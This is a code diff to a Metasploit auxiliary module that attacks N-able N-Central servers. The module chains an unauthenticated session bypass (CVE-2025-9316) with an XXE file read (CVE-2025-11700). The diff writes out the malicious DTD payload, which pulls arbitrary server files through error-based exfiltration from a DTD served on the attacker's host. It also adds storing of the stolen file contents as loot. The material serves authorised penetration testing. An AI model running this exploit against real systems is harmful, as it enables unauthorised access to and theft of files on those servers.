@@ -62,6 +62,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @dtd_filename = "#{Rex::Text.rand_text_alpha(8..15)}.dtd"
+    # NOTE: SSL is disabled by default as N-Central (Java) cannot validate self-signed certificates
+    # and will fail with: "PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException:
+    # unable to find valid certification path to requested target". HTTP works fine for XXE exploitation.
     start_service({
       'Uri' => {
         'Proc' => proc do |cli, req|
@@ -79,6 +82,14 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     print_status("Scanning #{ip}:#{rport} for N-Central vulnerabilities")
 
+    service = report_service(
+      host: ip,
+      port: rport,
+      proto: 'tcp',
+      name: 'http',
+      info: 'N-able N-Central'
+    )
+
     # Test for CVE-2025-9316 (Authentication Bypass)
     session_id, appliance_id = test_auth_bypass
     unless session_id && appliance_id
@@ -92,13 +103,14 @@ class MetasploitModule < Msf::Auxiliary
     report_vuln(
       host: ip,
       port: rport,
+      service: service,
       name: 'N-able N-Central Unauthenticated Session Bypass',
       refs: ['CVE-2025-9316'],
       info: "Session ID: #{session_id}, Appliance ID: #{appliance_id}"
     )
 
     # Test for CVE-2025-11700 (XXE) using the obtained session
-    test_xxe(session_id, appliance_id)
+    test_xxe(session_id, appliance_id, service)
   end
 
   def test_auth_bypass
@@ -133,8 +145,10 @@ class MetasploitModule < Msf::Auxiliary
     ].any? { |err| body_lower.include?(err) }
   end
 
-  def test_xxe(session_id, appliance_id)
+  def test_xxe(session_id, appliance_id, service)
     vprint_status("Testing CVE-2025-11700 (XXE) with session ID: #{session_id} (target file: #{datastore['FILE']})")
+
+    @nonexistent_path = Rex::Text.rand_text_alpha(8..15)
 
     xxe_payload = build_xxe_payload
     encoded_payload = Rex::Text.encode_base64(xxe_payload)
@@ -161,10 +175,15 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_good("#{rhost}:#{rport} - XXE file read succeeded (CVE-2025-11700)")
-    print_good("File contents:\n#{file_content}")
+    print_line
+    print_line(file_content)
+    print_line
+    stored_path = store_loot('nable.file', 'text/plain', rhost, file_content, datastore['FILE'], "XXE file read - #{datastore['FILE']}", service)
+    print_good("Stored #{datastore['FILE']} to #{stored_path}")
     report_vuln(
       host: rhost,
       port: rport,
+      service: service,
       name: 'N-able N-Central XXE Vulnerability',
       refs: ['CVE-2025-11700'],
       info: "XXE triggered via importServiceTemplateFromFile - File: #{datastore['FILE']}"
@@ -172,6 +191,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def build_xxe_payload
+    # NOTE: Using http:// only - SSL is disabled as N-Central (Java) fails with:
+    # "PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException:
+    # unable to find valid certification path to requested target"
     dtd_url = "http://#{srvhost_addr}:#{srvport}/#{@dtd_filename}"
     template_name = Rex::Text.rand_text_alpha(8..15)
 
@@ -244,21 +266,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def parse_session_id(response_body)
-    [
-      %r{<SessionID[^>]*>(\d+)</SessionID>}i,
-      %r{<sessionId>(\d+)</sessionId>}i,
-      %r{<sessionID>(\d+)</sessionID>}i
-    ].each do |pattern|
-      match = response_body.match(pattern)
-      return match[1] if match
-    end
-    nil
+    response_body.downcase.match(%r{<sessionid[^>]*>(\d+)</sessionid>})&.[](1)
   end
 
   def extract_file_contents(response_text)
     # Extract file contents from SOAP fault detail
-    # Pattern: <detail><string>[tid: UUID] /nonexistent/<file_contents> (File name too long)</string>
-    pattern = %r{<detail><string>\[tid:[^\]]+\]\s*/nonexistent/(.*?)(?:\s*\(File name too long\))?</string>}m
+    # Pattern: <detail><string>[tid: UUID] /<file_contents> (File name too long)</string>
+    # The file content is injected directly into the path, so we capture everything after "] /"
+    pattern = %r{<detail><string>\[tid:[^\]]+\]\s*/(.*?)(?:\s*\(File name too long\))?</string>}m
 
     match = response_text.match(pattern)
     return nil unless match
@@ -292,7 +307,7 @@ class MetasploitModule < Msf::Auxiliary
     # The FileNotFoundException error message will contain the file contents
     <<~DTD
       <!ENTITY % #{ent_file} SYSTEM "file://#{datastore['FILE']}">
-      <!ENTITY % #{ent_eval} "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%#{ent_file};'>">
+      <!ENTITY % #{ent_eval} "<!ENTITY &#x25; error SYSTEM 'file:///#{@nonexistent_path}/%#{ent_file};'>">
       %#{ent_eval};
       %error;
     DTD
